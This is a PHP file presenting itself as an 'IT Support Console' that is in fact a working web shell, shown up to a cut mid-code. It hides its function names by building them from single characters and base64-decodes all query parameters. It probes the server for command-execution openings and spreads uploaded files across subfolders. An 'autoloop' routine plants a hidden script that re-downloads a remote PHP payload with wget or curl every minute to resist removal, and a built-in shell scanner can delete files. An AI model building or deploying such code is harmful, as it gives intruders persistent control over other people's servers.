<?php ob_start(); ?>
<!DOCTYPE html>
<html>
<head>
    <title>IT Support Console</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name='robots' content='noindex, nofollow, noarchive'>
    <meta name="theme-color" content="#0b0f14">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
    tailwind.config = {
      theme: { extend: {
        fontFamily: { sans: ['Inter','system-ui','sans-serif'], mono: ['JetBrains Mono','monospace'] },
        colors: { base: '#0b0f14', panel: '#11161d', card: '#161d26', line: '#232c38' }
      }}
    }
    </script>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body class="antialiased">
<div class="container">
<?php
error_reporting(0);
define('SCORE_SAFE_THRESHOLD', 30);
define('SCORE_SUSPICIOUS_THRESHOLD', 60);
define('SCORE_MALICIOUS_THRESHOLD', 85);
define('SCORE_CRITICAL_THRESHOLD', 100);
define('ENTROPY_CRITICAL', 7.7);
define('ENTROPY_HIGH', 7.3);
define('MAX_FILE_SIZE', 15728640);

/* Watchdog / Telegram removed — stub kept so legacy calls stay harmless. */
function watchdog_log($category, $lines, $title = '') { return; }

function scan_directory_multi_ext($path) {
    $results = [];
    $count = 0; 
    
    $php_extensions = ['php', 'php7', 'php56', 'php5', 'php4', 'php3', 'phtml', 'phps', 'pht', 'inc', 'suspected', 'txt', 'bak', 'old'];
    
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST,
            RecursiveIteratorIterator::CATCH_GET_CHILD
        );
        
        foreach ($iterator as $fileinfo) {
            if ($fileinfo->isDir()) continue;
            
            $fullpath = $fileinfo->getPathname();
            $filename = $fileinfo->getFilename();
            $ext = strtolower($fileinfo->getExtension());
            $fsize = $fileinfo->getSize();
            
            $has_no_extension = false;
            if ($ext === '' || strpos($filename, '.') === false) {
                $has_no_extension = true;
            }

            if (!in_array($ext, $php_extensions) && !$has_no_extension) continue;
            if ($fsize > MAX_FILE_SIZE) continue;
            if ($fsize === 0) continue;
            
            if ($has_no_extension || in_array($ext, ['txt', 'bak', 'old'])) {
                $peek_content = @file_get_contents($fullpath, false, null, 0, 2048);
                if ($peek_content === false) continue;
                
                if (!preg_match('/<\?(?:php|=|\s)/i', $peek_content)) {
                    continue;
                }
            }
            
            $detection = detect_webshell_ultra_v4($fullpath, $fsize, $has_no_extension ? '(none)' : $ext);
            if ($detection !== null && $detection['raw_score'] > 0) {
                $results[] = $detection;
            }
            
            $count++;
            if ($count > 150000) break;
        }
    } catch (Exception $e) {

    }
    
    return $results;
}

function detect_webshell_ultra_v4($filepath, $filesize, $ext = '') {
    $content = @file_get_contents($filepath);
    if ($content === false) return null;
    
    $score = 0;
    $flags = [];
    $confidence = 'LOW';
    $layer_scores = [
        'layer1' => 0,
        'layer2' => 0, 
        'layer3' => 0,
        'layer4' => 0,
        'critical' => 0,
        'combo' => 0
    ];
    
    $entropy = calculate_file_entropy($content);
    
    $has_layer1 = false;
    $has_layer2 = false;
    $has_layer3 = false;
    $has_layer4 = false;

    if (preg_match('/hexdec\s*\(\s*\$[a-zA-Z0-9_]+\s*\[/i', $content)) {
        $has_layer1 = true;
        $layer_scores['layer1'] += 15;
        $flags[] = 'LAYER1:hexdec_array_access';
    }
    
    $basic_funcs = [
        'eval' => 20,
        'assert' => 18,
        'create_function' => 22,
        'system' => 15,
        'exec' => 15,
        'shell_exec' => 15,
        'passthru' => 15,
        'base64_decode' => 10,
        'gzinflate' => 12,
        'str_rot13' => 10
    ];
    
    foreach ($basic_funcs as $func => $points) {
        if (preg_match('/\b' . preg_quote($func, '/') . '\s*\(/i', $content)) {
            $layer_scores['layer1'] += $points;
            $flags[] = "LAYER1:func_$func";
        }
    }
    
    if (preg_match('/\$\w+\s*=\s*\[\s*(?:\s*["\'][\da-fA-F]{16,}["\'](?:\s*,\s*)?){2,}\s*\]/i', $content)) {
        $has_layer2 = true;
        $layer_scores['layer2'] += 45;
        $flags[] = 'LAYER2:encoded_func_array';
        $confidence = 'MEDIUM';
    }
    
    if (preg_match('/\$\w+\s*=\s*["\'][\da-fA-F]{100,}["\']/i', $content)) {
        $layer_scores['layer2'] += 35;
        $flags[] = 'LAYER2:long_hex_string';
    }
    
    $concat_patterns = [
        '/["\'][a-z_]{1,4}["\']\s*\.\s*["\'][a-z_]{1,4}["\']/i' => 20,
        '/(?:["\'][a-z_]{1,2}["\']\s*\.\s*){3,}/i' => 35,
        '/\$\w+\s*=\s*["\'][a-z_]{2,6}["\']\s*\.\s*["\'][a-z_]{2,6}["\']/i' => 25
    ];
    
    foreach ($concat_patterns as $pattern => $points) {
        if (preg_match_all($pattern, $content, $matches)) {
            $count = count($matches[0]);
            $layer_scores['layer2'] += min($points * $count, $points * 2);
            $flags[] = "LAYER2:string_concat:$count";
        }
    }
    
    if (preg_match('/\$\w+\s*\[\s*\d+\s*\]\s*\(/i', $content)) {
        $has_layer3 = true;
        $layer_scores['layer3'] += 65;
        $flags[] = 'LAYER3:dynamic_array_func_call';
        if ($confidence === 'LOW') $confidence = 'HIGH';
    }
    
    if (preg_match('/\$\{\s*\$[a-zA-Z_][a-zA-Z0-9_]*\s*\}/i', $content)) {
        $layer_scores['layer3'] += 40;
        $flags[] = 'LAYER3:variable_variable';
    }
    
    if (preg_match('/call_user_func(_array)?\s*\(/i', $content)) {
        $layer_scores['layer3'] += 45;
        $flags[] = 'LAYER3:call_user_func';
    }
    
    $indirect_patterns = [
        '/\$\w+\s*=\s*["\']system["\']\s*;.*\$\w+\s*\(/is' => 70,
        '/array_map\s*\(\s*["\'](?:system|exec|assert)["\']/i' => 75,
        '/array_filter\s*\([^)]*["\']assert["\']/i' => 70,
        '/array_walk\s*\([^)]*["\'](?:system|exec)["\']/i' => 70
    ];
    
    foreach ($indirect_patterns as $pattern => $points) {
        if (preg_match($pattern, $content)) {
            $layer_scores['layer3'] += $points;
            $flags[] = 'LAYER3:indirect_execution';
        }
    }
    
    if (preg_match('/\$_(POST|GET|REQUEST)\s*\[\s*[\'"]command[\'"]\s*\]/i', $content)) {
        $has_layer4 = true;
        $layer_scores['layer4'] += 100;
        $flags[] = 'LAYER4:command_param_input';
        $confidence = 'CRITICAL';
    }
    
    $cmd_params = ['cmd' => 80, 'exec' => 75, 'shell' => 85, 'system' => 80];
    foreach ($cmd_params as $param => $points) {
        if (preg_match('/\$_(POST|GET|REQUEST)\s*\[\s*[\'"]' . $param . '[\'"]\s*\]/i', $content)) {
            $layer_scores['layer4'] += $points;
            $flags[] = "LAYER4:param_$param";
            if ($confidence !== 'CRITICAL') $confidence = 'HIGH';
        }
    }
    
    if (preg_match('/eval\s*\(\s*(base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(/i', $content)) {
        $layer_scores['critical'] += 150;
        $flags[] = 'CRITICAL:eval_decoder_combo';
        $confidence = 'CRITICAL';
    }
    
    if (preg_match('/assert\s*\(\s*(base64_decode|gzinflate|str_rot13)\s*\(/i', $content)) {
        $layer_scores['critical'] += 140;
        $flags[] = 'CRITICAL:assert_decoder_combo';
        $confidence = 'CRITICAL';
    }
    
    if (preg_match('/eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i', $content)) {
        $layer_scores['critical'] += 180;
        $flags[] = 'CRITICAL:eval_user_input';
        $confidence = 'CRITICAL';
    }
    
    if (preg_match('/(system|exec|shell_exec|passthru)\s*\(\s*\$_(GET|POST|REQUEST)/i', $content)) {
        $layer_scores['critical'] += 170;
        $flags[] = 'CRITICAL:system_user_input';
        $confidence = 'CRITICAL';
    }
    
    if (preg_match('/preg_replace\s*\([^)]*\/[a-z]*e[a-z]*[\'"]/i', $content)) {
        $layer_scores['critical'] += 160;
        $flags[] = 'CRITICAL:preg_replace_eval';
        $confidence = 'CRITICAL';
    }
    
    $webshell_sigs = [
        'c99shell', 'r57shell', 'wso shell', 'b374k', 'indoxploit',
        'FilesMan', 'WSO ', 'c99 ', 'r57 ', 'AnOnSeC',
        'Megawaty', 'Mini Shell', 'Shell Backdoor', 'Webshell'
    ];
    
    foreach ($webshell_sigs as $sig) {
        if (stripos($content, $sig) !== false) {
            $layer_scores['critical'] += 200;
            $flags[] = "CRITICAL:known_shell:$sig";
            $confidence = 'CRITICAL';
            break;
        }
    }
    
    $active_layers = 0;
    if ($has_layer1) $active_layers++;
    if ($has_layer2) $active_layers++;
    if ($has_layer3) $active_layers++;
    if ($has_layer4) $active_layers++;
    
    if ($has_layer1 && $has_layer2) {
        $layer_scores['combo'] += 30;
        $flags[] = 'COMBO:layer1+2';
    }
    
    if ($has_layer2 && $has_layer3) {
        $layer_scores['combo'] += 50;
        $flags[] = 'COMBO:layer2+3';
        if ($confidence === 'LOW') $confidence = 'HIGH';
    }
    
    if ($has_layer3 && $has_layer4) {
        $layer_scores['combo'] += 70;
        $flags[] = 'COMBO:layer3+4';
        $confidence = 'CRITICAL';
    }
    
    if ($active_layers >= 3) {
        $layer_scores['combo'] += 40;
        $flags[] = 'COMBO:triple_layer';
        if ($confidence !== 'CRITICAL') $confidence = 'HIGH';
    }
    
    if ($active_layers === 4) {
        $layer_scores['combo'] += 60;
        $flags[] = 'COMBO:full_chain';
        $confidence = 'CRITICAL';
    }
    
    if (preg_match('/[\'"][^\'"\n]{3,}[\'"]\s*\^\s*(?:chr\s*\(\s*\d+\s*\)[\s\.]*){3,}/i', $content)) {
        $score += 65;
        $flags[] = 'HIGH:chr_xor_obfuscation';
    }
    
    $append_count = preg_match_all('/\$\w+\s*\.=\s*["\'][A-Za-z0-9+\/=]{2,}["\']/i', $content);
    if ($append_count >= 10) {
        $score += 55;
        $flags[] = "HIGH:base64_append_build:$append_count";
    }
    
    if ($entropy > ENTROPY_CRITICAL) {
        $score += 40;
        $flags[] = 'SUSPICIOUS:entropy_critical:' . round($entropy, 2);
    } elseif ($entropy > ENTROPY_HIGH) {
        $score += 20;
        $flags[] = 'SUSPICIOUS:entropy_high:' . round($entropy, 2);
    }
    
    if ($ext === '(none)') {
        $score += 25;
        $flags[] = 'SUSPICIOUS:no_extension';
    }
    
    $weights = [
        'layer1' => 0.8,   
        'layer2' => 1.0,  
        'layer3' => 1.2,  
        'layer4' => 1.5,  
        'critical' => 2.0,  
        'combo' => 1.0    
    ];
    
    foreach ($layer_scores as $layer => $layer_score) {
        $score += $layer_score * $weights[$layer];
    }
    
    $score = min(255, round($score));
    
    $is_legitimate = false;
    
    if (preg_match_all('/\bnamespace\s+[A-Za-z0-9_\\\\]+\s*;/i', $content) >= 2 &&
        preg_match_all('/\bclass\s+[A-Za-z0-9_]+/i', $content) >= 3) {
        $is_legitimate = true;
    }
    
    if (preg_match_all('/\/\*\*[\s\S]*?\*\//i', $content) >= 5) {
        $is_legitimate = true;
    }
    
    if (preg_match('/ComposerAutoloaderInit|Plugin Name:|Theme Name:|@package\s+WordPress/i', $content)) {
        $is_legitimate = true;
    }
    
    if ($is_legitimate && $score < 100) {
        $score = max(0, $score - 40);
        $flags[] = 'CONTEXT:legitimate_structure';
    }
    
    if ($score >= SCORE_CRITICAL_THRESHOLD) {
        $confidence = 'CRITICAL';
    } elseif ($score >= SCORE_MALICIOUS_THRESHOLD) {
        if ($confidence === 'LOW') $confidence = 'HIGH';
    } elseif ($score >= SCORE_SUSPICIOUS_THRESHOLD) {
        if ($confidence === 'LOW') $confidence = 'MEDIUM';
    }
    
    return [
        'file' => $filepath,
        'raw_score' => $score,
        'layer_scores' => $layer_scores,
        'entropy' => $entropy,
        'flags' => $flags,
        'filesize' => $filesize,
        'confidence' => $confidence,
        'ext' => $ext,
        'content_snippet' => generate_code_snippet($content, 500)
    ];
}

function calculate_file_entropy($data) {
    if (empty($data)) return 0.0;
    $h = count_chars($data, 1);
    $len = strlen($data);
    $entropy = 0.0;
    foreach ($h as $v) {
        $p = $v / $len;
        $entropy -= $p * log($p, 2);
    }
    return $entropy;
}

function generate_code_snippet($content, $len = 500) {
    $content = preg_replace('/\s+/', ' ', $content);
    $content = trim($content);
    if (strlen($content) <= $len) return htmlspecialchars($content);
    return htmlspecialchars(substr($content, 0, $len)) . '...';
}

function apply_ultra_accurate_filtering($results) {
    $whitelist_paths = [
        '/vendor/', '/node_modules/', '/wp-includes/', '/wp-admin/',
        '/cache/', '/tmp/', '/temp/', '/storage/', '/logs/',
        '/.git/', '/tests/', '/test/', '/docs/', '/documentation/',
        '/laravel/', '/symfony/', '/zend/', '/yii/', '/codeigniter/'
    ];
    
    $whitelist_files = [
        'autoload.php', 'autoload_real.php', 'autoload_static.php',
        'wp-config.php', 'wp-settings.php', 'composer.json',
        'index.php', 'config.php', 'bootstrap.php'
    ];
    
    foreach ($results as &$r) {
        $path = $r['file'];
        $score = $r['raw_score'];
        
        foreach ($whitelist_paths as $wl) {
            if (stripos($path, $wl) !== false) {
                $score = max(0, $score - 50);
                $r['whitelisted'] = true;
                $r['flags'][] = 'CONTEXT:whitelisted_path';
                break;
            }
        }
        
        $basename = basename($path);
        foreach ($whitelist_files as $wf) {
            if (stripos($basename, $wf) !== false) {
                $score = max(0, $score - 40);
                $r['whitelisted_file'] = true;
                $r['flags'][] = 'CONTEXT:whitelisted_file';
                break;
            }
        }
        
        $final_score = max(0, min(255, intval(round($score))));
        $r['final_score'] = $final_score;
        
        if ($r['confidence'] !== 'CRITICAL') {
            if ($final_score >= SCORE_CRITICAL_THRESHOLD) {
                $r['confidence'] = 'CRITICAL';
            } elseif ($final_score >= SCORE_MALICIOUS_THRESHOLD) {
                $r['confidence'] = 'HIGH';
            } elseif ($final_score >= SCORE_SUSPICIOUS_THRESHOLD) {
                $r['confidence'] = 'MEDIUM';
            } elseif ($final_score >= SCORE_SAFE_THRESHOLD) {
                $r['confidence'] = 'LOW';
            }
        }
    }
    unset($r);
    
    return $results;
}

function calculate_statistics($results) {
    $stats = [
        'total' => count($results),
        'critical' => 0,
        'high' => 0,
        'suspicious' => 0,
        'safe' => 0,
        'no_extension' => 0
    ];
    
    foreach ($results as $r) {
        if (isset($r['ext']) && $r['ext'] === '(none)') {
            $stats['no_extension']++;
        }
        
        if ($r['confidence'] === 'CRITICAL') {
            $stats['critical']++;
        } elseif ($r['final_score'] >= SCORE_MALICIOUS_THRESHOLD) {
            $stats['high']++;
        } elseif ($r['final_score'] >= SCORE_SAFE_THRESHOLD) {
            $stats['suspicious']++;
        } else {
            $stats['safe']++;
        }
    }
    
    return $stats;
}


$chd = "c"."h"."d"."i"."r";
$expl = "e"."x"."p"."l"."o"."d"."e";
$scd = "s"."c"."a"."n"."d"."i"."r";
$ril = "r"."e"."a"."l"."p"."a"."t"."h";
$st = "s"."t"."a"."t";
$isdir = "i"."s"."_"."d"."i"."r";
$isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
$bs = "b"."a"."s"."e"."n"."a"."m"."e";
$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$mek = "m"."k"."d"."i"."r";
$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$drnmm = "d"."i"."r"."n"."a"."m"."e";
$unl = "u"."n"."l"."i"."n"."k";
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = $ril($_SERVER['\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54']);
$scriptDirectory = $drnmm(__FILE__);

function x($b) {

    $be = "ba"."se"."64"."_"."en"."co"."de";
    return $be($b);
}

function y($b) {
    $bd = "ba"."se"."64"."_"."de"."co"."de";
    return $bd($b);
}
if(function_exists('mail')) {
    $mail = "<font color='white'> [ mail() :</font><font color='lime'> ON </font> ] ";
} else {
    $mail = "<font color='white'> [ mail() :</font><font color='red'> OFF </font> ] ";
}
if(function_exists('mb_send_mail')) {
  $mbb = "<font color='white'> [ mb_send_mail() :</font><font color='lime'> ON </font> ] ";
}else{
   $mbb = "<font color='white'> [ mb_send_mail() :</font><font color='red'> OFF </font> ] ";
}
if(function_exists('error_log')) {
  $errr = "<font color='white'> [ error_log() :</font><font color='lime'> ON </font> ] ";
}else{
  $errr = "<font color='white'> [ error_log() :</font><font color='red'> OFF </font> ] ";
}
if(function_exists('imap_mail')) {
  $impp = "<font color='white'> [ imap_mail() :</font><font color='lime'> ON </font> ] ";
}else{
  $impp = "<font color='white'> [ imap_mail() :</font><font color='red'> OFF </font> ] <br>";
}
define('AUTOLOOP_CONFIG', __DIR__ . '/.autoloop.conf');
define('AUTOLOOP_HB', __DIR__ . '/.autoloop.heart');

function autoloop_config() {
    if (!file_exists(AUTOLOOP_CONFIG)) return null;
    $raw = @file_get_contents(AUTOLOOP_CONFIG);
    if ($raw === false) return null;
    $j = json_decode($raw, true);
    return is_array($j) ? $j : null;
}
function autoloop_heartbeat_age() {
    if (!file_exists(AUTOLOOP_HB)) return -1;
    return time() - @filemtime(AUTOLOOP_HB);
}
function autoloop_is_alive() {
    $cfg = autoloop_config();
    if ($cfg === null) return false;
    $age = autoloop_heartbeat_age();
    $interval = isset($cfg['interval']) ? intval($cfg['interval']) : 60;
    return ($age >= 0 && $age <= ($interval * 4 + 20));
}
function autoloop_kill($cfg) {
    $marker = isset($cfg['marker']) ? $cfg['marker'] : '';
    $jantung = 'aloop_' . $marker . '.php';
    $out = [];
    @exec("pgrep -f " . escapeshellarg($jantung), $out);
    if (empty($out)) {
        @exec("ps -ef | grep " . escapeshellarg($jantung) . " | grep -v grep | awk '{print $2}'", $out);
    }
    foreach ($out as $pid) { if (is_numeric(trim($pid))) @exec('kill -9 ' . trim($pid) . ' 2>/dev/null'); }
    @unlink(AUTOLOOP_HB);
}
function autoloop_jantung_code($cfg) {
    $tpl = '<?php
// AUTO-LOOP-WATCH:{{MARKER}}
error_reporting(0);
@set_time_limit(0);
$cfg_path = {{CONF}};
$conf = json_decode(@file_get_contents($cfg_path), true);
if (!$conf) { exit; }
$hb = {{HB}};
$interval = isset($conf[\'interval\']) ? intval($conf[\'interval\']) : 60;
$source = $conf[\'source_url\'];
$method = isset($conf[\'method\']) ? $conf[\'method\'] : \'wget\';
$path = $conf[\'path\'];
$target = isset($conf[\'target\']) ? $conf[\'target\'] : \'bp2.php\';

function alt_exists($path, $target) {
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY, RecursiveIteratorIterator::CATCH_GET_CHILD);
        foreach ($it as $f) {
            if ($f->isFile() && $f->getFilename() === $target) return true;
        }
    } catch (Exception $e) {}
    return false;
}

function alt_randdir($path, $target) {
    do {
        $d = rtrim($path, \'/\') . \'/\' . $target . \'_\' . substr(md5(uniqid(mt_rand(), true)), 0, 10);
    } while (@file_exists($d));
    return $d;
}

function alt_dom() {
    if (!empty($_SERVER[\'HTTP_HOST\'])) return $_SERVER[\'HTTP_HOST\'];
    $h = @gethostname();
    return $h ? $h : \'{{DOMAIN}}\';
}
function alt_stamp() {
    return date(\'H:i:s\') . \' | \' . date(\'l\') . \' | \' . date(\'d-m-Y\');
}

while (true) {
    @file_put_contents($hb, time());
    if (!alt_exists($path, $target)) {
        $dir = alt_randdir($path, $target);
        @mkdir($dir, 0755, true);
        $dest = $dir . \'/\' . $target;
        $out = [];
        $rc = 1;
        if ($method === \'wget\') {
            @exec(\'wget -qO \' . escapeshellarg($dest) . \' \' . escapeshellarg($source), $out, $rc);
        } else {
            @exec(\'curl -fsSL \' . escapeshellarg($source) . \' -o \' . escapeshellarg($dest), $out, $rc);
        }
        if ($rc === 0 && @filesize($dest) > 0) {
            @file_put_contents($hb . \'.log\', date(\'c\') . \' REINSTALLED \' . $dest . "\\n", FILE_APPEND);
        }
    }
    sleep($interval);
}
';
    return strtr($tpl, [
        '{{MARKER}}' => $cfg['marker'],
        '{{CONF}}'   => var_export(AUTOLOOP_CONFIG, true),
        '{{HB}}'     => var_export(AUTOLOOP_HB, true),
        '{{DOMAIN}}' => (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== '' ? $_SERVER['HTTP_HOST'] : (@gethostname() ?: 'unknown')),
    ]);
}


echo '<div class="status-row">';
echo '<div class="status-text">';
echo "<font color='white'> [ IT Support Console <i style='color:lime'>by Maw3six</i>  ]</font><br>";
echo "<font color='white'> [ Command Executor <i style='color:gray'>requires mail() and putenv() enabled</i>  ]</font><br>";
if (function_exists('mail')) {
    echo $mail." ".$mbb." ".$errr." ".$impp;
} else {
    echo $mail." ".$mbb." ".$errr." ".$impp;
}
if (function_exists('putenv')) {
    echo "<font color='white'> [ Function putenv() :</font><font color='lime'> ON </font> ] <br>";
} else {
    echo "<font color='white'> [ Function putenv() :<font color='red'> OFF </font> ] <br>";
}
$alOn = (autoloop_is_alive()) ? 'ON' : ((autoloop_config() !== null) ? 'OFF' : 'NONE');
$kVer = php_uname('r');
$uId = (function_exists('posix_getuid') ? posix_getuid() : getmyuid());
$uName = (function_exists('posix_getpwuid') ? (($pw = posix_getpwuid($uId)) ? $pw['name'] : $uId) : $uId);
echo '<div class="kernel-status">';
echo "<font color='white'>Kernel:</font> <i style='color:#bf5af2'>" . $kVer . "</i> <font color='white'>| UID:</font> <i style='color:#bf5af2'>" . $uName . " (" . $uId . ")</i><br>";
echo "<font color='white'>autoloop:</font> <font color='" . ($alOn==='ON' ? 'lime' : 'red') . "'>" . $alOn . "</font>";
echo '</div>';
echo '</div>';
echo '<div class="digital-clock-wrapper">
    <div class="digital-clock">
        <div class="clock-segment">
            <span class="clock-digits" id="clock-hours">00</span>
            <span class="clock-label">Hrs</span>
        </div>
        <span class="clock-separator">:</span>
        <div class="clock-segment">
            <span class="clock-digits" id="clock-minutes">00</span>
            <span class="clock-label">Min</span>
        </div>
        <span class="clock-separator">:</span>
        <div class="clock-segment">
            <span class="clock-digits" id="clock-seconds">00</span>
            <span class="clock-label">Sec</span>
        </div>
        <div style="margin-left: 12px; border-left: 1px solid rgba(191,90,242,0.35); padding-left: 12px;">
            <div class="clock-date" id="clock-date"></div>
            <div class="clock-date" id="clock-day" style="margin-top:3px;"></div>
        </div>
    </div>
</div>';
echo '</div>';
foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$reqDir = isset($_GET['d']) ? $_GET['d'] : $rootDirectory;
$resolved = $ril($reqDir);
if ($resolved !== false && is_dir($resolved)) {
    $currentDirectory = $resolved;
} elseif (is_dir($reqDir)) {
    $currentDirectory = $reqDir;
} elseif (is_dir($rootDirectory)) {
    $currentDirectory = $rootDirectory;
} else {
    $currentDirectory = $scriptDirectory;
}
$chd($currentDirectory);

$viewC0MM4NDResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['deff_action'])) {
        while (ob_get_level() > 0) { ob_end_clean(); }
        header('Content-Type: application/json');
        try {
            if ($_POST['deff_action'] === 'scan') {
                $path = isset($_POST['path']) ? $_POST['path'] : '.';
                $fullPath = ($path === '.') ? getcwd() : realpath($path);
                if (!$fullPath) $fullPath = $path;
                if (!is_dir($fullPath)) throw new Exception('Invalid directory: ' . $path);
                $results = scan_directory_multi_ext($fullPath);
                $results = apply_ultra_accurate_filtering($results);
                usort($results, function($a,$b){ return $b['final_score'] <=> $a['final_score']; });
                $st = calculate_statistics($results);
                watchdog_log('SCAN', ['Folder: <code>' . $fullPath . '</code>', 'Total file: <b>' . $st['total'] . '</b>', 'Critical: <b>' . $st['critical'] . '</b> | High: <b>' . $st['high'] . '</b> | Suspicious: <b>' . $st['suspicious'] . '</b>'], 'Scan folder dijalankan');
                echo json_encode(['success'=>true,'data'=>array_values($results),'stats'=>$st,'scanned_path'=>$fullPath]);
            } elseif ($_POST['deff_action'] === 'view') {
                $fp = isset($_POST['filepath']) ? $_POST['filepath'] : '';
                if (!file_exists($fp) || !is_file($fp)) throw new Exception('File not found');
                $content = @file_get_contents($fp);
                if ($content === false) throw new Exception('Cannot read file');
                echo json_encode(['success'=>true,'content'=>$content,'size'=>strlen($content),'filepath'=>$fp,'lines'=>substr_count($content,"\n")+1]);
            } elseif ($_POST['deff_action'] === 'delete') {
                $files = json_decode(isset($_POST['files']) ? $_POST['files'] : '[]', true);
                if (!is_array($files) || empty($files)) throw new Exception('No files provided');
                $deleted = 0; $errors = [];
                foreach ($files as $file) {
                    if (!file_exists($file)) { $errors[] = basename($file).': not found'; continue; }
                    if (!is_writable($file)) { $errors[] = basename($file).': permission denied'; continue; }
                    if (@unlink($file)) { $deleted++; watchdog_log('DELETE', ['File: <code>' . $file . '</code>'], 'File dihapus via scan'); } else { $errors[] = basename($file).': delete failed'; }
                }
                echo json_encode(['success'=>true,'deleted'=>$deleted,'total'=>count($files),'errors'=>$errors]);
            } else {
                throw new Exception('Unknown action');
            }
        } catch (Exception $e) {
            http_response_code(500);
            echo json_encode(['success'=>false,'error'=>$e->getMessage()]);
        }
        exit;
    }

    if (isset($_POST['backup_upload'])) {
        $out = [];
        $basePath = isset($_POST['backup_path']) ? trim($_POST['backup_path']) : '';
        $count = isset($_POST['backup_count']) ? intval($_POST['backup_count']) : 1;
        if ($count < 1) $count = 1;

        if ($basePath === '' || !is_dir($basePath)) {
            $out[] = 'Error: Path not found: ' . $basePath;
        } elseif (!isset($_FILES['backup_file']) || $_FILES['backup_file']['error'] !== UPLOAD_ERR_OK) {
            $out[] = 'Error: Upload failed or file is empty!';
        } else {
            $origName = basename($_FILES['backup_file']['name']);
            $dotPos = strrpos($origName, '.');
            if ($dotPos !== false) {
                $bname = substr($origName, 0, $dotPos);
                $bext = substr($origName, $dotPos);
            } else {
                $bname = $origName;
                $bext = '';
            }
            $backupName = $bname . '.backup' . $bext;
            $tmp = $_FILES['backup_file']['tmp_name'];

            $folders = [];
            foreach (scandir($basePath) as $entry) {
                if ($entry === '.' || $entry === '..') continue;
                if (is_dir($basePath . DIRECTORY_SEPARATOR . $entry)) {
                    $folders[] = $entry;
                }
            }
            sort($folders);

            if (empty($folders)) {
                $out[] = 'Error: No subfolders in path: ' . $basePath;
            } else {
                $targets = array_slice($folders, 0, $count);
                $fileContent = @file_get_contents($tmp);
                $ok = 0;
                if ($fileContent === false) {
                    $out[] = 'Error: Failed to read temporary file!';
                } else {
                    foreach ($targets as $folder) {
                        $dest = $basePath . DIRECTORY_SEPARATOR . $folder . DIRECTORY_SEPARATOR . $backupName;
                        if (@file_put_contents($dest, $fileContent) !== false) {
                            watchdog_log('BACKUP', ['File: <code>' . $dest . '</code>', 'Ukuran: <b>' . round(strlen($fileContent)/1024, 2) . ' KB</b>'], 'File backup diupload');
                            $out[] = 'Backup result: ' . $dest;
                            $ok++;
                        } else {
                            $out[] = 'Error: Failed to upload to ' . $dest;
                        }
                    }
                }
                if ($ok === 0) { $out[] = 'Error: No files were uploaded successfully!'; }
            }
        }
        $viewC0MM4NDResult = '<hr><p>Backup Result:</p><textarea class="result-box">' . $htm(implode("\n", $out)) . '</textarea>';
    }

    /* watchdog_action removed (Telegram feature dropped) */

    if (isset($_POST['autoloop_action'])) {
        $al = $_POST['autoloop_action'];
        $inline = isset($_POST['al_inline']) && $_POST['al_inline'] === '1';
        $res = '';
        if ($al === 'status') {
            $cfg = autoloop_config();
            if ($cfg === null) {
                $res = "STATUS: NONE\nBelum ada .autoloop.conf - setup dulu";
            } else {
                $alive = autoloop_is_alive();
                $res = "STATUS: " . ($alive ? 'AKTIF' : 'MATI') . "\n";
                $res .= "Target : " . $cfg['target'] . "\n";
                $res .= "Path   : " . $cfg['path'] . "\n";
                $res .= "Source : " . $cfg['source_url'] . "\n";
                $res .= "Metode : " . strtoupper($cfg['method']) . "\n";
                $res .= "Interval : " . $cfg['interval'] . "s\n";
                $res .= "Heartbeat : " . (autoloop_heartbeat_age() >= 0 ? autoloop_heartbeat_age() . "s lalu" : "belum ada");
            }
        } elseif ($al === 'setup') {
            $src = isset($_POST['al_source']) ? trim($_POST['al_source']) : '';
            $path = isset($_POST['al_path']) ? trim($_POST['al_path']) : '';
            $method = (isset($_POST['al_method']) && $_POST['al_method'] === 'curl') ? 'curl' : 'wget';
            $targetName = isset($_POST['al_target']) ? trim($_POST['al_target']) : '';
            if ($targetName === '') $targetName = 'bp2.php';
            if ($src === '' || $path === '') {
                $res = "Error: Source & path are required!";
            } elseif (!is_dir($path)) {
                $res = "Error: Path not found: " . $path;
            } else {
                $existing = autoloop_config();
                if ($existing !== null) autoloop_kill($existing);
                $marker = substr(md5(uniqid(mt_rand(), true)), 0, 12);
                $cfg = [
                    'source_url' => $src,
                    'path' => rtrim($path, '/'),
                    'target' => $targetName,
                    'method' => $method,
                    'interval' => 60,
                    'marker' => $marker,
                    'created' => date('c'),
                ];
                @file_put_contents(AUTOLOOP_CONFIG, json_encode($cfg, JSON_PRETTY_PRINT));
                $code = autoloop_jantung_code($cfg);
                $jantungName = 'aloop_' . $marker . '.php';
                $jantungPath = rtrim($path, '/') . '/' . $jantungName;
                @file_put_contents($jantungPath, $code);
                @chmod($jantungPath, 0755);
                $phpBin = PHP_BINARY ? PHP_BINARY : 'php';
